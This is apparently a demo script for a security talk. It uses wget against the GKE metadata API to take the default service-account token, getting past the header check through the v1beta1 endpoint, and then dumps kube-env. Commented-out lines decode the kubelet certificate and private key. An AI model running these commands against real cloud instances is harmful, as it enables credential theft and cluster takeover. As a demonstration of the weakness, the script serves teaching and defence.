#!/bin/bash

set -e

. demo-magic.sh -d
clear

p "# Try to get the token from the metadata API"
pe "wget http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" || true
p "# Failed since we didn't set 'Metadata-Flavor: Google' header, but...."
pe "wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"
echo ""
p "# Check token scopes"
p "# Grab kube-env"
pe "wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json"

# Leaving this out, it's a bit too confusing, since I'd have to explain the attacker couldn't run
# shell commands.
#pe "wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env | grep CA_CERT kube-env | sed s'/CA_CERT: //g' | base64 -d"
#pe "wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env | grep KUBELET_CERT kube-env | sed s'/KUBELET_CERT: //g' | base64 -d"
#pe "wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env | grep KUBELET_KEY kube-env | sed s'/KUBELET_KEY: //g' | base64 -d"
